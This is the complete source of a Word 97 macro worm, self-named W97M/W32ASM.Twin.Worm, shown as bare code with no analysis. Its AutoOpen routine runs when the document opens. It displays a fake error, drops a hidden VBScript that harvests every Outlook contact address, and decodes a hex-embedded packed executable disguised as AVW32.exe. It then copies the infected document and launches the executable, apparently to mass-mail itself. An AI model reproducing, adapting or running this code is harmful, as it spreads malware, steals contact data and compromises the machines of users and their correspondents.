Attribute VB_Name = "twin"
Sub AutoOpen()
win = Environ("windir")
thisfile = ActiveDocument.Name
full = ActiveDocument.FullName

MsgBox "This file has some problems", vbCritical, thisfile

e = "exe="""
e = e + "4D5A50000200000004000F00FFFF0000B80000000000000040001A00000000000000000000000000000000000000000000000000000000000000000000010000BA10000E1FB409CD21B8014CCD219090546869732070726F6772616D206D7573742062652072756E20756E6465722057696E33320D0A243700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000504500004C010300412C8C960000000000000000E0008F810B010219001000000010000000500000406300000060000000700000000040000010000000020000010000000000000003000A00000000000080000000100000000000000200000000001000002000000000100000100000000000001000000000000000000000000070000020010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "00000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000E0555058310000000000100000006000000006000000040000000000000000000000000000400000E05550583200000000001000000070000000020000000A0000000000000000000000000000400000C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000312E323000555058210C090209AE31EA559859EB50AA4200003E03000000200000260000F6FFA70A92006A32BE00204000566A00FF37DBB7E80C034B6A19090101CA416E74695669727573FFFED7FE20467265657761042101FD536F66740D5C4D6963B7F6FFE6726F735C57696E646F77735C4375721736566577DFF6FF7273696F6E5C52756E006802338059633C0218436E63DFCA3A5C2D2E7662736F397E6832B7FFCF6721513B5C4E6574496E666F2E5163007D90ED641B216A0BE4694875F1F375BBAE0E0103030168C3805B76BB1F737F6261636B75702E61292D400F84821F4893F6BFA57B2F030253183385C0746695140FB6F90E045512574D961F4583F8FFFFEFFE03763933D2BF647357AC3C2074143C0D74133C0A741E3C2374203C40BFBFFFFF750142AAEBE746EBE432C0AA5F85D274D4350BEBCD0EEBC727447EBF560D5D55053F535D27FE60DFFE33C050506862215350FF35E8CE6FC3FF25AC30C8C8C8D60B05B0B4B8C8C8C8C8BCC0C4C8C8C8C8C8CCD0D4DC8AC8CCC8E4EC00EDFF7F804120636F6D6963616C2073746F72"
e = e + "7920660494FDDEFE20796F752E004910656E640B206123F606FCDD75196F6E2074686520F92E0D0A0177F7FFF60942651D20526567617264732E20593766726942092283354A3D5F2204B801DF00EC4A0521F490AE5B260292130107AAC00B646FC22300230906D873F103008D501119B050215C08A89218C6160105489BAB22CA088CAC20FB7FF92F016C7374726361744578697450726F636573730CFE03F97F43726561746546696C65414D617070696E67F6BFACED1344650D206C6F736548616E640D7FF6D7B60C47171653697A0C4D6F64756C01E0DE63294E616D2D139C09DA9E97446959633015C0DEDEEF5A566965774F66290E556E6D1041FF34DBB099EC4D41504953A7D95A2B73301716A4DC69B6F6DB5348147456616C756215B0E4BB77EDF6496EA4726E1873436F6E6E6D6564FFF22CDC5374CD7350454C010400412C8C49F3FF9096E0008F810B0102190004083B7B9AE6A2111020400B025F82823D983303000A50E4EC2559E7042833109DEDB2D909003028142AB0778400405200D8F792FD434F44458C03B30627BD24BF5C206044415441C76CE153F6AB0AA2C02E696453614F10C00619300C2706196CA3EF2A634F4010C075DFCAF204F447067D0000000000009000FF0000"
e = e + "60BE006040008DBE00B0FFFF5783CDFFEB109090909090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9150000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70589D8E2D98DBE004000008B0709C0743C8B5F048D84300060000001F35083C708FF9664600000958A074708C074DC89F95748F2AE55FF966860000009C07407890383C304EBE1FF966C60000061E90EADFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008C700000647000000000000000000000000000009970000074700000000000000000000000000000A47000007C700000000000000000000000000000B0700000847000000000000000000000000000000000000000000000BC700000CA700000DA70000000000000E870000000000000F67000000000000004710000000000004B45524E454C33322E444C4C004D41504933322E444C4C0053484C574150492E646C6C0057494E494E45542E646C6C0000004C6F61644C69627261727941000047657450726F6341646472657373000045786974"
e = e + "50726F636573730000004D41504953656E644D61696C0000534853657456616C756541000000496E7465726E6574476574436F6E6E656374656453746174650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
e = e + """"

f = "fso.CopyFile """
f = f + full
f = f + """, win&""\NetInfo.doc"""

Open "C:\Twin.vbs" For Output As #1
Print #1, "On Error Resume Next"
Print #1, "Set fso=CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set w=CreateObject(""WScript.Shell"")"
Print #1, "Set win=fso.GetSpecialFolder(0)"
Print #1, "Set Twin=CreateObject(""Outlook.Application"")"
Print #1, "Set deux=Twin.GetNameSpace(""MAPI"")"
Print #1, "Set c=fso.CreateTextFile(""C:\backup.win"")"
Print #1, "c.Close"
Print #1, "For Each polux In deux.AddressLists"
Print #1, "If polux.AddressEntries.Count <> 0 Then"
Print #1, "For jumeaux = 1 To polux.AddressEntries.Count"
Print #1, "Set castor = polux.AddressEntries(jumeaux)"
Print #1, "Set c=fso.OpenTextFile(""C:\backup.win"",8,true)"
Print #1, "c.WriteLine castor.Address"
Print #1, "c.Close"
Print #1, "Next"
Print #1, "End If"
Print #1, "Next"
Print #1, "Set c=fso.OpenTextFile(""C:\backup.win"",8,true)"
Print #1, "c.WriteLine ""#"""
Print #1, "c.Close"
Print #1, ""
Print #1, e
Print #1, "lire=decr(exe)"
Print #1, "Set exfile=fso.CreateTextFile(win&""\AVW32.exe"",true)"
Print #1, "exfile.Write lire"
Print #1, "exfile.Close"
Print #1, f
Print #1, "w.Run win&""\AVW32.exe"", 1, False"
Print #1, "Function decr(octet)"
Print #1, "For hexa = 1 To Len(octet) Step 2"
Print #1, "decr = decr & Chr(""&h"" & Mid(octet, hexa, 2))"
Print #1, "Next"
Print #1, "End Function"
Close #1
Shell "wscript C:\Twin.vbs", vbHide
End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "Message for " & Application.UserName & vbCrLf & "How Are You"
    .Heading = "W97M/W32ASM.Twin.Worm"
    .Animation = msoAnimationSendingMail
    .Button = msoButtonSetOK
    .Show
End With
End Sub


